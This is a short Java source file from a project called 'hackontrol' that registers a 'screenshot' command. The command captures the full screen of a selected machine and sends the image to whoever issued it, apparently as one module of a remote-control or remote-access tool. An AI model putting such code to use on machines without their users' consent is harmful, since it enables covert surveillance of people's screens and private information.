package com.khopan.hackontrol.command;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;

import com.khopan.hackontrol.source.CommandSource;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;

public class ScreenshotCommand implements Command {
	@Override
	public void register(CommandDispatcher<CommandSource> dispatcher) {
		dispatcher.register(LiteralArgumentBuilder.<CommandSource>literal("screenshot").requires(source -> source.isSelected()).executes(context -> {
			CommandSource source = context.getSource();
			Robot robot;

			try {
				robot = new Robot();
			} catch(Throwable ignored) {
				source.message("Error: Failed to screenshot");
				return -1;
			}

			BufferedImage screenshot = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			source.sendImage(screenshot, '`' + source.getName() + "` screenshot:");
			return 1;
		}));
	}
}
